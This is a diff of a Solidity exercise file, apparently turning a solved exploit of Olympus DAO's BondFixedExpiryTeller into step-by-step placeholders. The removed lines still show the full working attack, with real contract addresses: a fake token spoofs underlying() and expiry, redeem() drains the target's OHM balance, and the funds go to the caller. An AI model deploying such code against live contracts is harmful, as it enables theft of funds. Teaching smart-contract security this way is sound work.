@@ -24,9 +24,6 @@ interface BondFixedExpiryTeller {
 }
 
 contract BadToken {
-    // Address of OHM Token
-    ERC20 constant tokenContract = ERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
-
     function expiry() external pure returns (uint48 _expiry) {
         // Return a timestamp anytime before now
         return uint48(0x0);
@@ -34,38 +31,30 @@ contract BadToken {
 
     function burn(address from, uint256 amount) external pure {}
 
-    function underlying() external pure returns (ERC20 _underlying) {
-        return tokenContract;
-    }
+    // Step 1: Add underlying() function to the token it must match whats expected on the
+    // Olympus DAOs BondFixedExpiryTeller contract
 }
 
 // AttactContract Class
 contract AttackContract {
-    address immutable owner = tx.origin;
 
     // Address of OHM Token
-    ERC20 constant tokenContract = ERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
+    ERC20 constant OHM = ERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
 
     // Address of Olympus DAOs BondFixedExpiryTeller contract
     BondFixedExpiryTeller constant targetContract = BondFixedExpiryTeller(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156);
     
-    event CallFailed(bytes reason);
-
     // Entry point for the attack, this will be called by an EOA using JavaScript
     function startAttack() external {
-        require(tx.origin == owner);
 
-        // Get OHM Token balance of the target contract
-        uint256 targetBalance = tokenContract.balanceOf(address(targetContract));
+        // Step 2: Get OHM Token balance of the target contract
 
-        // Start attack by calling the target contract's redeem function
-        // - arg1: this contracts deployed address
-        // - arg2: the target address's balance of OHM Token
-        //try targetContract.redeem(address(this), targetBalance) {
-        BadToken badToken = new BadToken();
-        targetContract.redeem(address(badToken), targetBalance);
+        // Step 3: Deploy our malicious token
 
-        // transfer stolen funds from this contract to transaction originator
-        tokenContract.transfer(tx.origin, targetBalance);
+        // Step 4: Start attack by calling the target contract's redeem function
+        // - arg1: Address of malicious token
+        // - arg2: Target contract's OHM Token balance
+
+        // Step 5: Transfer stolen funds from this contract back to the EoA!
     }
 }
